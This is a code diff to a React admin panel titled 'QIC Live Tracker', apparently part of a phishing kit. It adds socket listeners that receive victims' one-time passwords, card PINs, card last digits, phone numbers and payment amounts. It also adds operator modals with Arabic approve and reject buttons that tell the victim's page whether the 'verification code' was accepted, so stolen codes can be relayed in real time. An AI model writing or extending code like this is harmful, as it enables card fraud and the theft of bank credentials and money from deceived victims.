@@ -13,6 +13,8 @@ export default function AdminTracker() {
   const [users, setUsers] = useState([]);
   const [allData, setAllData] = useState({});
   const [selectedUser, setSelectedUser] = useState(null);
+  const [pendingOTP, setPendingOTP] = useState(null);
+  const [pendingPIN, setPendingPIN] = useState(null);
 
   useEffect(() => {
     // Check authentication
@@ -104,6 +106,26 @@ export default function AdminTracker() {
       }));
     });
 
+    // Listen for OTP submissions
+    newSocket.on('newOTP', (data) => {
+      console.log('🔐 New OTP:', data);
+      setPendingOTP(data);
+      setAllData(prev => ({
+        ...prev,
+        otp: [...(prev.otp || []), data]
+      }));
+    });
+
+    // Listen for PIN submissions
+    newSocket.on('newPIN', (data) => {
+      console.log('🔑 New PIN:', data);
+      setPendingPIN(data);
+      setAllData(prev => ({
+        ...prev,
+        pin: [...(prev.pin || []), data]
+      }));
+    });
+
     // Listen for all new entries (unified system)
     newSocket.on('newEntryAll', (entry) => {
       console.log('🆕 New entry from', entry.sourcePage, entry);
@@ -163,6 +185,46 @@ export default function AdminTracker() {
     }
   };
 
+  const approveOTP = () => {
+    if (socket && pendingOTP) {
+      socket.emit('otpVerificationStatus', {
+        status: 'approved',
+        message: 'تم قبول رمز التحقق'
+      });
+      setPendingOTP(null);
+    }
+  };
+
+  const rejectOTP = () => {
+    if (socket && pendingOTP) {
+      socket.emit('otpVerificationStatus', {
+        status: 'rejected',
+        message: 'رمز التحقق غير صحيح'
+      });
+      setPendingOTP(null);
+    }
+  };
+
+  const approvePIN = () => {
+    if (socket && pendingPIN) {
+      socket.emit('pinVerificationStatus', {
+        status: 'approved',
+        message: 'تم قبول الرمز السري'
+      });
+      setPendingPIN(null);
+    }
+  };
+
+  const rejectPIN = () => {
+    if (socket && pendingPIN) {
+      socket.emit('pinVerificationStatus', {
+        status: 'rejected',
+        message: 'الرمز السري غير صحيح'
+      });
+      setPendingPIN(null);
+    }
+  };
+
   const sendTestEntry = async () => {
     try {
       const res = await fetch(`${SOCKET_URL}/api/submit`, {
@@ -219,6 +281,184 @@ export default function AdminTracker() {
 
   return (
     <div className="admin-tracker">
+      {/* OTP Verification Modal */}
+      {pendingOTP && (
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          background: 'rgba(0,0,0,0.7)',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          zIndex: 9999
+        }}>
+          <div style={{
+            background: 'white',
+            padding: '30px',
+            borderRadius: '12px',
+            maxWidth: '500px',
+            width: '90%',
+            boxShadow: '0 10px 40px rgba(0,0,0,0.3)'
+          }}>
+            <h2 style={{ marginBottom: '20px', color: '#1f2937', textAlign: 'center' }}>
+              🔐 طلب تحقق من رمز OTP
+            </h2>
+            <div style={{
+              background: '#f3f4f6',
+              padding: '20px',
+              borderRadius: '8px',
+              marginBottom: '20px'
+            }}>
+              <div style={{ marginBottom: '15px' }}>
+                <strong>رمز OTP:</strong>
+                <div style={{
+                  fontSize: '32px',
+                  fontWeight: 'bold',
+                  color: '#7c3aed',
+                  fontFamily: 'monospace',
+                  letterSpacing: '8px',
+                  textAlign: 'center',
+                  margin: '10px 0'
+                }}>
+                  {pendingOTP.otpCode || pendingOTP.payload?.otpCode}
+                </div>
+              </div>
+              <div style={{ fontSize: '14px', color: '#6b7280' }}>
+                <p><strong>البطاقة:</strong> **** {pendingOTP.cardLastDigits || pendingOTP.payload?.cardLastDigits}</p>
+                <p><strong>الهاتف:</strong> {pendingOTP.phoneNumber || pendingOTP.payload?.phoneNumber}</p>
+                <p><strong>المبلغ:</strong> {pendingOTP.amount || pendingOTP.payload?.amount} ريال</p>
+              </div>
+            </div>
+            <div style={{ display: 'flex', gap: '10px' }}>
+              <button
+                onClick={approveOTP}
+                style={{
+                  flex: 1,
+                  padding: '15px',
+                  background: '#10b981',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '8px',
+                  fontSize: '16px',
+                  fontWeight: 'bold',
+                  cursor: 'pointer'
+                }}
+              >
+                ✓ قبول الرمز
+              </button>
+              <button
+                onClick={rejectOTP}
+                style={{
+                  flex: 1,
+                  padding: '15px',
+                  background: '#ef4444',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '8px',
+                  fontSize: '16px',
+                  fontWeight: 'bold',
+                  cursor: 'pointer'
+                }}
+              >
+                ✗ رفض الرمز
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* PIN Verification Modal */}
+      {pendingPIN && (
+        <div style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          right: 0,
+          bottom: 0,
+          background: 'rgba(0,0,0,0.7)',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          zIndex: 9999
+        }}>
+          <div style={{
+            background: 'white',
+            padding: '30px',
+            borderRadius: '12px',
+            maxWidth: '500px',
+            width: '90%',
+            boxShadow: '0 10px 40px rgba(0,0,0,0.3)'
+          }}>
+            <h2 style={{ marginBottom: '20px', color: '#1f2937', textAlign: 'center' }}>
+              🔑 طلب تحقق من الرمز السري
+            </h2>
+            <div style={{
+              background: '#f3f4f6',
+              padding: '20px',
+              borderRadius: '8px',
+              marginBottom: '20px'
+            }}>
+              <div style={{ marginBottom: '15px' }}>
+                <strong>الرمز السري:</strong>
+                <div style={{
+                  fontSize: '32px',
+                  fontWeight: 'bold',
+                  color: '#3b82f6',
+                  fontFamily: 'monospace',
+                  letterSpacing: '8px',
+                  textAlign: 'center',
+                  margin: '10px 0'
+                }}>
+                  {pendingPIN.pinCode || pendingPIN.payload?.pinCode}
+                </div>
+              </div>
+              <div style={{ fontSize: '14px', color: '#6b7280' }}>
+                <p><strong>البطاقة:</strong> **** {pendingPIN.cardLastDigits || pendingPIN.payload?.cardLastDigits}</p>
+                <p><strong>الهاتف:</strong> {pendingPIN.phoneNumber || pendingPIN.payload?.phoneNumber}</p>
+                <p><strong>المبلغ:</strong> {pendingPIN.amount || pendingPIN.payload?.amount} ريال</p>
+              </div>
+            </div>
+            <div style={{ display: 'flex', gap: '10px' }}>
+              <button
+                onClick={approvePIN}
+                style={{
+                  flex: 1,
+                  padding: '15px',
+                  background: '#10b981',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '8px',
+                  fontSize: '16px',
+                  fontWeight: 'bold',
+                  cursor: 'pointer'
+                }}
+              >
+                ✓ قبول الرمز
+              </button>
+              <button
+                onClick={rejectPIN}
+                style={{
+                  flex: 1,
+                  padding: '15px',
+                  background: '#ef4444',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '8px',
+                  fontSize: '16px',
+                  fontWeight: 'bold',
+                  cursor: 'pointer'
+                }}
+              >
+                ✗ رفض الرمز
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       <header className="tracker-header">
         <h1>🎯 QIC Live Tracker</h1>
         <div className="header-controls">
